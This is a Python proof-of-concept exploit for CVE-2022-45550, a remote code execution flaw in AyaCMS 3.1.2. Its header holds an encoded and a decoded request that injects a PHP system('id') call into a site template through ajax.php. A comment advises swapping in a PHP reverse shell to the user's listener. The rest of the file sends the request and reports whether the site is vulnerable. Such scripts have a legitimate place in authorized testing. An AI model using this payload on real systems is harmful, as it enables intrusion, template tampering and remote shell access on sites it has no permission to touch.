# Usage python3 CVE-2022-45550_AyaCMS_RCE.py -u http://localhost:8000 -p "/ajax.php%3Ffun%3Ddiy_save%26tpl_file%3D%5B%22aya%2Ftemplate%2Fdefault%2Ffooter.html%22%5D%26diy%3D%7B%22t%22%3A%5B%22t%22%2C%22c2b8cc463f0243617d136a57b8ef0e3a_0%22%2C%22%7B%5C%22pars%5C%22%3A%5C%22t%5C%22%2C%5C%22name%5C%22%3A%5C%22t%27%2C%27%27%7D%7Bsystem%28%27id%27%29%7D%7B%5C%22%7D%22%5D"
# Unencoded payload request "/ajax.php?fun=diy_save&tpl_file=["aya/template/default/footer.html"]&diy={"t":["t","c2b8cc463f0243617d136a57b8ef0e3a_0","{\"pars\":\"t\",\"name\":\"t',''}{system('id')}{\"}"]}"
# Modify the "id" string to include your PHP reverse shell back to your listener.
# Tested on AyaCMS 3.1.2

import requests
import sys
import argparse
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", help="URL to check")
parser.add_argument("-p", "--payload", help="Payload to check")
args = parser.parse_args()
if not args.url:
    parser.print_help()

url = args.url
payload = args.payload
r = requests.get(url + payload)
if r.status_code == 200:
    if "uid" in r.text:
        print("The AyaCMS 3.1.2 is vulnerable to remote code execution vulnerability")
    else:
        print("The AyaCMS 3.1.2 is not vulnerable to remote code execution vulnerability")
elif r.status_code == 500:
    print("The AyaCMS 3.1.2 is not vulnerable to remote code execution vulnerability")
elif r.status_code == 404:
    print("The AyaCMS 3.1.2 is not vulnerable to remote code execution vulnerability")
elif r.status_code == 403:
    print("The AyaCMS 3.1.2 is not vulnerable to remote code execution vulnerability")
elif r.status_code == 401:
    print("The AyaCMS 3.1.2 is not vulnerable to remote code execution vulnerability")
elif r.status_code == 400:
    print("The AyaCMS 3.1.2 is not vulnerable to remote code execution vulnerability")
elif r.status_code == 300:
    print("The AyaCMS 3.1.2 is not vulnerable to remote code execution vulnerability")
else:
    print("The AyaCMS 3.1.2 is not vulnerable to remote code execution vulnerability")
    sys.exit(1)
sys.exit(0)